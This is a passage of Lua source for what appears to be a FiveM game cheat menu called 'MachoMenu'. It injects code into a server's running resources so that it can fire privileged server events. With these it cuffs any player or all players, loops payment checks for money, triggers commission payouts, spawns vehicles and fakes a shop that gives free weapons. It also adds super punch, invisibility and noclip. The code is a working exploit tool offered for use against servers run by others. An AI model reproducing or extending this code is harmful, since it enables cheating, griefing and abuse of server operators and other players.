                        Citizen.Wait(10) -- ØªØ£Ø®ÙŠØ± 10 Ù…Ù„Ù„ÙŠ Ø«Ø§Ù†ÙŠØ©
                    end
                end
                if cuffedCount > 0 then
                    MachoMenuNotification("Players", "Tried cuffing " .. cuffedCount .. " IDs!")
                else
                    MachoMenuNotification("Error", "No valid IDs processed!")
                end
            end)
        else
            local serverId = tonumber(playerId)
            if serverId and serverId > 0 then
                for _, triggerData in ipairs(foundTriggers.items) do
                    MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                end
                MachoMenuNotification("Players", "Cuffed Player ID: " .. serverId)
            else
                MachoMenuNotification("Error", "Invalid Player ID")
            end
        end
    else
        MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
    end
end)

    MachoMenuButton(PlayersSection, "Uncuff Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. numId .. ', false)')
                        end
                        MachoMenuNotification("Players", "Uncuffed Player ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Uncuffed all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. numId .. ', false)')
                    end
                    MachoMenuNotification("Players", "Uncuffed Player ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

end

-- Check for littlethings resource and execute trigger
local function checkAndExecuteLittlethings()
    local totalRes = GetNumResources()
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "littlethings") then
                MachoInjectResource(resName, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                table.insert(foundTriggers.payment, {
                    resource = resName,
                    trigger = "QBCore:server:Paymentcheck",
                    file = "littlethings",
                    state = "started"
                })
                MachoMenuNotification("Success", "Found littlethings resource, executing payment check")
                return true
            end
        end
    end
    return false
end

-- Comprehensive search
local function comprehensiveSearch()
    foundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
    local foundCount = 0
    local expandedMappings = {
        ["qb-core"] = {
            {type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"},
        },
        ["qb-inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qs-inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["esx_inventoryhud"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["origen_inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["core_inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["hd-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qb-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["esx-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["police"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qb-shops"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["core-bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["envi-bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}}
    }

    -- Check mapped resources
    for resourceName, triggers in pairs(expandedMappings) do
        local state = GetResourceState(resourceName)
        if state == "started" then
            for _, triggerInfo in ipairs(triggers) do
                table.insert(foundTriggers[triggerInfo.type], {
                    resource = resourceName,
                    trigger = triggerInfo.trigger,
                    file = "database",
                    state = state
                })
                foundCount = foundCount + 1
            end
        end
    end

    -- Search for "littlethings" resource for payment trigger
    local totalRes = GetNumResources()
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "littlethings") then
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers.payment) do
                    if existing.trigger == "QBCore:server:Paymentcheck" then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers.payment, {
                        resource = resName,
                        trigger = "QBCore:server:Paymentcheck",
                        file = "littlethings",
                        state = "started"
                    })
                    foundCount = foundCount + 1
                end
            end
        end
    end

    -- Search for auction-related resources
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "carauction") or string.find(lowerName, "auction") then
                local dynamicTrigger = resName .. ":server:GiveComm"
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers.money) do
                    if existing.trigger == dynamicTrigger then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers.money, {
                        resource = resName,
                        trigger = dynamicTrigger,
                        file = "auction-pattern",
                        state = "started"
                    })
                    foundCount = foundCount + 1
                end
            end
        end
    end

    -- Advanced pattern search for additional triggers
    local advancedPatterns = {
        {patterns = {"inventory", "inv"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"police", "cop", "sheriff", "leo"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"job", "work", "employment"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"shop", "store", "market"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"core", "framework", "base"}, triggers = {{type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"}}},
        {patterns = {"vehicle", "car", "garage"}, triggers = {{type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"}}},
        {patterns = {"carauction", "auction"}, triggers = {{type = "money", trigger = "qb-carauction:server:GiveComm"}}}
    }
    local skipPatterns = {
        "mysql", "discord", "screenshot", "loading", "weather", "time",
        "map", "ui", "hud", "chat", "voice", "radio", "salt", "admin",
        "logging", "webpack", "yarn", "node", "lib", "util", "config",
        "monitor", "filesystem", "dependencies", "helper"
    }

    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            local shouldSkip = false
            for _, skipPattern in ipairs(skipPatterns) do
                if string.find(lowerName, skipPattern, 1, true) then
                    shouldSkip = true
                    break
                end
            end
            if expandedMappings[resName] or string.find(lowerName, "littlethings") then
                shouldSkip = true
            end
            if not shouldSkip then
                for _, patternGroup in ipairs(advancedPatterns) do
                    local matches = false
                    for _, pattern in ipairs(patternGroup.patterns) do
                        if string.find(lowerName, pattern, 1, true) then
                            matches = true
                            break
                        end
                    end
                    if matches then
                        for _, triggerInfo in ipairs(patternGroup.triggers) do
                            local isDuplicate = false
                            for _, existing in ipairs(foundTriggers[triggerInfo.type]) do
                                if existing.resource == resName and existing.trigger == triggerInfo.trigger then
                                    isDuplicate = true
                                    break
                                end
                            end
                            if not isDuplicate then
                                table.insert(foundTriggers[triggerInfo.type], {
                                    resource = resName,
                                    trigger = triggerInfo.trigger,
                                    file = "pattern",
                                    state = "started"
                                })
                                foundCount = foundCount + 1
                            end
                        end
                        break
                    end
                end
            end
            if foundCount >= 50 then
                break
            end
        end
    end

    -- If QBCore:server:Paymentcheck not found in littlethings, execute check
    if #foundTriggers.payment == 0 then
        checkAndExecuteLittlethings()
    end

    return foundCount > 0
end

-- Enhanced pattern search
local function enhancedPatternSearch()
    foundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
    local foundCount = 0
    local totalResources = GetNumResources()
    local searchedResources = 0

    local function advancedSearchFile(resourceName, fileName, content)
        local found = false
        local contentLower = string.lower(content)
        local resourceState = GetResourceState(resourceName)
        local inventoryPatterns = {
            "inventory:server:openinventory",
            "inventory:server:open",
            "qb%-inventory:server:openinventory",
            "qs%-inventory:server:openinventory",
            "ox_inventory:openinventory",
            "esx_inventoryhud:server:openinventory"
        }
        for _, pattern in ipairs(inventoryPatterns) do
            if string.find(contentLower, pattern) then
                local exactTrigger = "inventory:server:OpenInventory"
                local exactMatch = content:match("'([^']*[Ii]nventory[^']*[Oo]pen[Ii]nventory[^']*)'") or
                                   content:match('"([^"]*[Ii]nventory[^"]*[Oo]pen[Ii]nventory[^"]*)"')
                if exactMatch then
                    exactTrigger = exactMatch
                end
                table.insert(foundTriggers.items, {
                    resource = resourceName,
                    trigger = exactTrigger,
                    file = fileName,
                    state = resourceState
                })
                foundCount = foundCount + 1
                found = true
                break
            end
        end
        if string.find(contentLower, ":server:givecomm") then
            local fullTrigger = "QBCore:server:GiveCommission"
            local exactMatch = content:match("'([^']*[Gg]ive[Cc]omm[^']*)'") or
                               content:match('"([^"]*[Gg]ive[Cc]omm[^"]*)"')
            if exactMatch then
                fullTrigger = exactMatch
            end
            table.insert(foundTriggers.money, {
                resource = resourceName,
                trigger = fullTrigger,
                file = fileName,
                state = resourceState
            })
            foundCount = foundCount + 1
            found = true
        end
        if string.find(contentLower, "server:paymentcheck") then
            local fullTrigger = "QBCore:server:Paymentcheck"
            table.insert(foundTriggers.payment, {
                resource = resourceName,
                trigger = fullTrigger,
                file = fileName,
                state = resourceState
            })
            foundCount = foundCount + 1
            found = true
        end
        if string.find(contentLower, "spawnvehicle") then
            local fullTrigger = "QBCore:Command:SpawnVehicle"
            local exactMatch = content:match("'([^']*[Ss]pawn[Vv]ehicle[^']*)'") or
                               content:match('"([^"]*[Ss]pawn[Vv]ehicle[^"]*)"')
            if exactMatch then
                fullTrigger = exactMatch
            end
            local isDuplicate = false
            for _, existing in ipairs(foundTriggers.vehicle) do
                if existing.resource == resourceName and existing.trigger == fullTrigger then
                    isDuplicate = true
                    break
                end
            end
            if not isDuplicate then
                table.insert(foundTriggers.vehicle, {
                    resource = resourceName,
                    trigger = fullTrigger,
                    file = fileName,
                    state = resourceState
                })
                foundCount = foundCount + 1
                found = true
            end
        end
        return found
    end

    for i = 0, totalResources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if resourceName then
            searchedResources = searchedResources + 1
            local skipPatterns = {
                "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                "discord", "screenshot", "loading", "spawn", "weather", "time",
                "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                "filesystem", "monitor", "admin", "logging"
            }
            local shouldSkip = false
            local lowerName = string.lower(resourceName)
            for _, pattern in ipairs(skipPatterns) do
                if string.find(lowerName, pattern, 1, true) then
                    shouldSkip = true
                    break
                end
            end
            if not shouldSkip then
                local priorityFiles = {
                    "client.lua", "server.lua", "shared.lua",
                    "client/main.lua", "server/main.lua",
                    "client/interactions.lua"
                }
                for _, fileName in ipairs(priorityFiles) do
                    local success, content = pcall(function()
                        return LoadResourceFile(resourceName, fileName)
                    end)
                    if success and content and content ~= "" and string.len(content) < 500000 then
                        advancedSearchFile(resourceName, fileName, content)
                    end
                end
            end
            if searchedResources % 25 == 0 then
                MachoMenuNotification("Safe Search", "Progress: " .. math.floor((searchedResources/totalResources)*100) .. "% | Found: " .. foundCount)
                Citizen.Wait(25)
            end
            if foundCount >= 15 then
                break
            end
        end
    end
    return foundCount > 0
end

-- Original config generation
local function generateOriginalConfig()
    local configCode = [[
        local Config = {}
        Config.Products = {
            ["arcadebar"] = {
                [1] = { name = "faberge-egg", price = 0, amount = 100000000, info = {}, type = "item", slot = 1 },
                [2] = { name = "weapon_heavypistol", price = 0, amount = 100000000, info = {}, type = "item", slot = 2 },
                [3] = { name = "weapon_pistol_mk2", price = 0, amount = 100000000, info = {}, type = "item", slot = 3 },
                [4] = { name = "pistol_ammo", price = 0, amount = 100000000, info = {}, type = "item", slot = 4 },
                [5] = { name = "armor", price = 0, amount = 100000000, info = {}, type = "item", slot = 5 },
                [6] = { name = "ziptie", price = 0, amount = 100000000, info = {}, type = "item", slot = 6 },
                [7] = { name = "weapon_carbinerifle", price = 0, amount = 100000000, info = {}, type = "item", slot = 7 },
                [8] = { name = "bandage", price = 0, amount = 100000000, info = {}, type = "item", slot = 8 },
                [9] = { name = "lockpick", price = 0, amount = 100000000, info = {}, type = "item", slot = 9 },
                [10] = { name = "radio", price = 0, amount = 100000000, info = {}, type = "item", slot = 10 }
            }
        }
        Config.Locations = {
            ["arcadebar"] = {
                ["blip"] = "arcadebar_shop_blip",
                ["label"] = "arcadebar_shop",
                ["type"] = "arcadebar",
                ["coords"] = {[1] = vector3(339.17, -909.97, 29.25)},
                ["products"] = Config.Products["arcadebar"],
            },
        }
        local ShopItems = {}
        ShopItems.label = Config.Locations["arcadebar"]["label"]
        ShopItems.items = Config.Locations["arcadebar"]["products"]
        ShopItems.slots = 10
    ]]
    return configCode, 10
end

-- Player IDs functions
local function clearAllGamerTags()
    pcall(function()
        for pid, data in pairs(playerGamerTags) do
            if data and data.gamerTag and IsMpGamerTagActive(data.gamerTag) then
                RemoveMpGamerTag(data.gamerTag)
            end
        end
        playerGamerTags = {}
    end)
end

local function setGamerTagFivem(targetTag, pid)
    pcall(function()
        if targetTag and IsMpGamerTagActive(targetTag) then
            SetMpGamerTagVisibility(targetTag, 0, 1)
            SetMpGamerTagHealthBarColor(targetTag, 129)
            SetMpGamerTagAlpha(targetTag, 2, 255)
            SetMpGamerTagVisibility(targetTag, 2, 1)
            SetMpGamerTagAlpha(targetTag, 4, 0)
            SetMpGamerTagVisibility(targetTag, 4, 0)
            SetMpGamerTagColour(targetTag, 0, 0)
        end
    end)
end

local function clearGamerTagFivem(targetTag)
    pcall(function()
        if targetTag and IsMpGamerTagActive(targetTag) then
            SetMpGamerTagVisibility(targetTag, 0, 0)
            SetMpGamerTagVisibility(targetTag, 2, 0)
            SetMpGamerTagVisibility(targetTag, 4, 0)
        end
    end)
end

local function startPlayerIdThread()
    Citizen.CreateThread(function()
        local distanceToCheck = 150
        while isPlayerIdsEnabled do
            local success, err = pcall(function()
                local curCoords = GetEntityCoords(PlayerPedId())
                local allActivePlayers = GetActivePlayers()
                for _, pid in ipairs(allActivePlayers) do
                    if pid and pid ~= -1 then
                        local targetPed = GetPlayerPed(pid)
                        if targetPed and DoesEntityExist(targetPed) then
                            if not playerGamerTags[pid] or playerGamerTags[pid].ped ~= targetPed or not IsMpGamerTagActive(playerGamerTags[pid].gamerTag) then
                                local playerName = GetPlayerName(pid) or "unknown"
                                local serverId = GetPlayerServerId(pid) or 0
                                if playerName and serverId > 0 then
                                    playerName = string.sub(playerName, 1, 75)
                                    local playerStr = '[' .. serverId .. '] ' .. playerName
                                    playerGamerTags[pid] = {
                                        gamerTag = CreateFakeMpGamerTag(targetPed, playerStr, false, false, 0),
                                        ped = targetPed
                                    }
                                end
                            end
                            if playerGamerTags[pid] and playerGamerTags[pid].gamerTag then
                                local targetTag = playerGamerTags[pid].gamerTag
                                local targetPedCoords = GetEntityCoords(targetPed)
                                if targetPedCoords and curCoords then
                                    local distance = #(targetPedCoords - curCoords)
                                    if distance <= distanceToCheck then
                                        setGamerTagFivem(targetTag, pid)
                                    else
                                        clearGamerTagFivem(targetTag)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            if not success then
            end
            Citizen.Wait(250)
        end
        pcall(function()
            clearAllGamerTags()
        end)
    end)
end

-- Payment loop for QBCore:server:Paymentcheck
local function startPaymentLoop()
    isPaymentLoopRunning = true
    Citizen.CreateThread(function()
        while isPaymentLoopRunning do
            -- Check if we have payment triggers available
            if #foundTriggers.payment > 0 then
                for _, triggerData in ipairs(foundTriggers.payment) do
                    if triggerData.trigger == "QBCore:server:Paymentcheck" then
                        -- Execute the payment check directly without UI interference
                        Citizen.CreateThread(function()
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                        end)
                    end
                end
                MachoMenuNotification("Money", "Payment check triggered")
            else
                -- Try to find littlethings resource again
                local totalRes = GetNumResources()
                local foundPaymentResource = false
                for i = 0, totalRes - 1 do
                    local resName = GetResourceByFindIndex(i)
                    if resName and GetResourceState(resName) == "started" then
                        local lowerName = string.lower(resName)
                        if string.find(lowerName, "littlethings") then
                            -- Verify the resource contains the payment check by checking files
                            local paymentEventFound = false
                            local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                            for _, fileName in ipairs(checkFiles) do
                                local success, content = pcall(function()
                                    return LoadResourceFile(resName, fileName)
                                end)
                                if success and content and content ~= "" then
                                    local contentLower = string.lower(content)
                                    if string.find(contentLower, "paymentcheck") or string.find(contentLower, "payment.*check") then
                                        paymentEventFound = true
                                        break
                                    end
                                end
                            end
                            if paymentEventFound then
                                Citizen.CreateThread(function()
                                    MachoInjectResource(resName, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                                end)
                                foundPaymentResource = true
                                MachoMenuNotification("Money", "Payment check triggered from " .. resName)
                                break
                            end
                        end
                    end
                end
                if not foundPaymentResource then
                    MachoMenuNotification("Error", "Payment check resource not found")
                    isPaymentLoopRunning = false
                    if paymentCheckbox then
                        MachoMenuSetCheckbox(paymentCheckbox, false)
                    end
                    break
                end
            end
            Citizen.Wait(paymentLoopSpeed)
        end
    end)
end




-- Menu creation
local function createMenu()
    MenuWindow = MachoMenuTabbedWindow("by q1", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
    MachoMenuSetAccent(MenuWindow, 255, 255, 0)

    
    MachoMenuText(MenuWindow,"Player & Self")
    local GeneralTab = MachoMenuAddTab(MenuWindow, "Player")
    local LeftSectionWidth = (MenuSize.x - TabsBarWidth) * 0.5
    local RightSectionWidth = (MenuSize.x - TabsBarWidth) * 0.35
    local RightSectionHeight = (MenuSize.y - 20) / 2

    local GeneralLeftSection = MachoMenuGroup(GeneralTab, "looks & Outfits", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
        
        

MachoMenuButton(GeneralLeftSection, "Random outfit", function()
    Citizen.CreateThread(function()
        while not NetworkIsPlayerActive(PlayerId()) do
            Citizen.Wait(0)
        end
    
        Citizen.Wait(0) 
    
        local model = GetHashKey("mp_m_freemode_01")  
    
        RequestModel(model)
        while not HasModelLoaded(model) do
            Citizen.Wait(0)
        end
    
        SetPlayerModel(PlayerId(), model)
        SetModelAsNoLongerNeeded(model)
    
        local newPed = PlayerPedId()
    
        SetPedComponentVariation(newPed, 8, math.random(0, 15), 0, 2)  
        SetPedComponentVariation(newPed, 11, math.random(0, 120), 0, 2) 
        SetPedComponentVariation(newPed, 3, math.random(0, 15), 0, 2)   
        SetPedComponentVariation(newPed, 4, math.random(0, 50), 0, 2)   
        SetPedComponentVariation(newPed, 6, math.random(0, 30), 0, 2)   
    
        SetPedPropIndex(newPed, 0, math.random(0, 10), 0, true) 
        SetPedPropIndex(newPed, 1, math.random(0, 10), 0, true)  
    
    end)
    
end)
local enableRandomOutfit = false
local outfitChangeInterval = 0 

MachoMenuCheckbox(GeneralLeftSection, "Random Outfit Loop", 
    function()
        enableRandomOutfit = true
    end,
    function()
        enableRandomOutfit = false
    end
)
MachoMenuText(GeneralLeftSection,"Exploits & Self")
MachoMenuCheckbox(GeneralLeftSection, "Super Punch", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
            local playerPed = PlayerPedId() 
            local weaponHash = GetHashKey("WEAPON_UNARMED") 
            
            SetWeaponDamageModifier(weaponHash, 9999.0)
        ]])
        
        MachoMenuNotification("Combat", "Super Punch enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                local playerPed = PlayerPedId() 
                local weaponHash = GetHashKey("WEAPON_UNARMED") 
                
                SetWeaponDamageModifier(weaponHash, 1.0)
            ]])
            
            MachoMenuNotification("Combat", "Super Punch disabled")
        end
    end
)
local invisibilityLoop = false
MachoMenuCheckbox(GeneralLeftSection, "kill frindly", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 140, true)
           SetPedConfigFlag(PlayerPedId(), 45, true)
           SetPedConfigFlag(PlayerPedId(), 442, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 140, false)
                SetPedConfigFlag(PlayerPedId(), 45, false)
                SetPedConfigFlag(PlayerPedId(), 442, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
local invisibilityAlpha = 255 -- Ø§Ù„Ù‚ÙŠÙ…Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© (Ù…Ø±Ø¦ÙŠ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„)
local invisibilityLoop = false

local selectedKey = 0

local InvisibilitySlider = MachoMenuSlider(GeneralLeftSection, "Invisibility Level", 210, 0, 210, "%", 0, function(Value)
    invisibilityAlpha = Value
    
    -- ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„ØªØºÙŠÙŠØ± ÙÙˆØ±Ø§Ù‹ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø§Ø®ØªÙØ§Ø¡ Ù…ÙØ¹Ù„
    if invisibilityLoop then
        local playerPed = PlayerPedId()
        
        -- Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª: Ø§Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø´ÙØ§ÙÙŠØ©
        if invisibilityAlpha == 0 then
            SetEntityVisible(playerPed, false, false)
        else
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, invisibilityAlpha, false)
        end
    end
end)

MachoMenuCheckbox(GeneralLeftSection, "Invisible",
    function()
        invisibilityLoop = true
        MachoMenuNotification("Invisible", "Activated - Alpha: " .. invisibilityAlpha)
        
        CreateThread(function()
            while invisibilityLoop do
                local playerPed = PlayerPedId()
                
                -- Ù„Ù„Ø¢Ø®Ø±ÙŠÙ†: Ø¥Ø®ÙØ§Ø¡ ÙƒØ§Ù…Ù„ Ø¯Ø§Ø¦Ù…Ø§Ù‹
                SetEntityVisible(playerPed, false, false)
                
                -- Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª ÙÙ‚Ø·: Ø¬Ø¹Ù„ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù…Ø±Ø¦ÙŠØ© Ù…Ø­Ù„ÙŠØ§Ù‹
                SetEntityLocallyVisible(playerPed)
                
                -- ØªØ·Ø¨ÙŠÙ‚ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´ÙØ§ÙÙŠØ© Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª
                if invisibilityAlpha == 0 then
                    SetEntityAlpha(playerPed, 0, false)
                else
                    SetEntityAlpha(playerPed, invisibilityAlpha, false)
                end
                
                Wait(0)
            end
            
            -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ© Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ù„ØºØ§Ø¡
            local playerPed = PlayerPedId()
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, 255, false)
        end)
    end,
    function()
        invisibilityLoop = false
        MachoMenuNotification("Invisible", "Deactivated")
        
        -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ©
        local playerPed = PlayerPedId()
        SetEntityVisible(playerPed, true, false)
        SetEntityAlpha(playerPed, 255, false)
    end
)

-- Keybind Ù„Ù„Ø§Ø®ØªØµØ§Ø±
MachoMenuKeybind(GeneralLeftSection, "Invisible Key", 0, function(key, toggle)
    selectedKey = key
end)

-- ÙˆØ¸ÙŠÙØ© Ø§Ù„Ø§Ø®ØªØµØ§Ø±
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not invisibilityLoop then
            invisibilityLoop = true
            MachoMenuNotification("Invisible", "Activated - Alpha: " .. invisibilityAlpha)
            
            CreateThread(function()
                while invisibilityLoop do
                    local playerPed = PlayerPedId()
                    
                    -- Ù„Ù„Ø¢Ø®Ø±ÙŠÙ†: Ø¥Ø®ÙØ§Ø¡ ÙƒØ§Ù…Ù„
                    SetEntityVisible(playerPed, false, false)
                    
                    -- Ù„Ù„ÙƒÙ„Ø§ÙŠÙ†Øª: Ø¬Ø¹Ù„ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù…Ø±Ø¦ÙŠØ© Ù…Ø­Ù„ÙŠØ§Ù‹
                    SetEntityLocallyVisible(playerPed)
                    
                    -- ØªØ·Ø¨ÙŠÙ‚ Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø´ÙØ§ÙÙŠØ©
                    if invisibilityAlpha == 0 then
                        SetEntityAlpha(playerPed, 0, false)
                    else
                        SetEntityAlpha(playerPed, invisibilityAlpha, false)
                    end
                    
                    Wait(0)
                end
                
                -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ© Ø¹Ù†Ø¯ Ø§Ù„Ø¥Ù„ØºØ§Ø¡
                local playerPed = PlayerPedId()
                SetEntityVisible(playerPed, true, false)
                SetEntityAlpha(playerPed, 255, false)
            end)
        else
            invisibilityLoop = false
            MachoMenuNotification("Invisible", "Deactivated")
            
            -- Ø¥Ø±Ø¬Ø§Ø¹ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ø¨ÙŠØ¹ÙŠØ©
            local playerPed = PlayerPedId()
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, 255, false)
        end
    end
end)
local noclip = false
local noclipSpeed = 1
local originalCollision = {}
local selectedKey = 0

-- Ø§Ù„Ø³Ù„Ø§ÙŠØ¯Ø± Ù„Ù„Ø³Ø±Ø¹Ø©
local NoclipSpeedSlider = MachoMenuSlider(GeneralLeftSection, "Noclip Speed", 1, 0.1, 10, "", 1, function(Value)
    noclipSpeed = Value
end)

-- Ø¯Ø§Ù„Ø© Ø§Ù„Ù†ÙˆÙƒÙ„ÙŠØ¨ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
local function NoclipLoop()
    CreateThread(function()
        while noclip do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local x, y, z = coords.x, coords.y, coords.z
            local speed = noclipSpeed
            local veh = GetVehiclePedIsIn(ped, 0)
            
            local entity
            if veh ~= 0 then
                entity = veh
            else
                entity = ped
            end

            SetEntityCollision(entity, false, false)
            SetEntityVelocity(entity, 0.0, 0.0, 0.0)

